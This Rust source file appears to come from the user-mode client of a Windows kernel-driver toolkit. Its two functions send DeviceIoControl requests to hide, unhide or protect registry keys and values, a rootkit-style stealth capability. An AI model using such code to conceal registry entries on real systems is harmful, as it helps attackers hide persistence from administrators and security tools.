use {
    log::*,
    crate::utils::open_driver,
    shared::structs::TargetRegistry,
    std::{ffi::c_void, ptr::null_mut},
    windows_sys::Win32::{
        Foundation::{CloseHandle, GetLastError},
        System::IO::DeviceIoControl,
    },
};

pub fn registry_protection(ioctl_code: u32, value: &String, key: &String, enable: bool) {
    info!("Attempting to open the registry for protection operation");

    let h_file = open_driver().expect("Failed to open driver");

    debug!("Preparing structure for Key: {} | Value: {} | Protection: {}", key, value, if enable { "hide" } else { "unhide" });
    let mut info_registry = TargetRegistry {
        enable,
        value: value.to_string(),
        key: key.to_string(),
    };
    
    debug!("Sending DeviceIoControl command to {} protection for key: {} | value: {}", if enable { "enable" } else { "disable" }, key, value);
    let mut return_buffer = 0;
    let status = unsafe {
        DeviceIoControl(
            h_file,
            ioctl_code,
            &mut info_registry as *mut _ as *mut c_void,
            std::mem::size_of::<TargetRegistry>() as u32,
            null_mut(),
            0,
            &mut return_buffer,
            null_mut(),
        )
    };

    if status == 0 {
        error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
    } else {
        info!("Registry protection {} for Key: {} and Value: {} succeeded", if enable { "enabled" } else { "disabled" }, key, value);
    }

    debug!("Closing the driver handle");
    unsafe {
        CloseHandle(h_file);
    }
}

pub fn registry_hide_unhide(ioctl_code: u32, value: &String, key: &String, enable: bool) {
    info!("Attempting to open the registry for hide/unhide operation");

    let h_file = open_driver().expect("Failed to open driver");

    debug!("Preparing structure for Key: {} | Value: {} | Operation: {}", key, value, if enable { "hide" } else { "unhide" });
    let mut info_registry = TargetRegistry {
        enable,
        key: key.to_string(),
        value: value.to_string(),
        ..Default::default()
    };

    debug!("Sending DeviceIoControl command to {} registry for Key: {} | Value: {}", if enable { "hide" } else { "unhide" }, key, value);
    let mut return_buffer = 0;
    let status = unsafe {
        DeviceIoControl(
            h_file,
            ioctl_code,
            &mut info_registry as *mut _ as *mut c_void,
            std::mem::size_of::<TargetRegistry>() as u32,
            null_mut(),
            0,
            &mut return_buffer,
            null_mut(),
        )
    };

    if status == 0 {
        error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
    } else {
        info!("Registry with Key: {} and Value: {} successfully {}hidden", key, value, if enable { "" } else { "un" });
    }

    debug!("Closing the driver handle");
    unsafe {
        CloseHandle(h_file);
    }
}
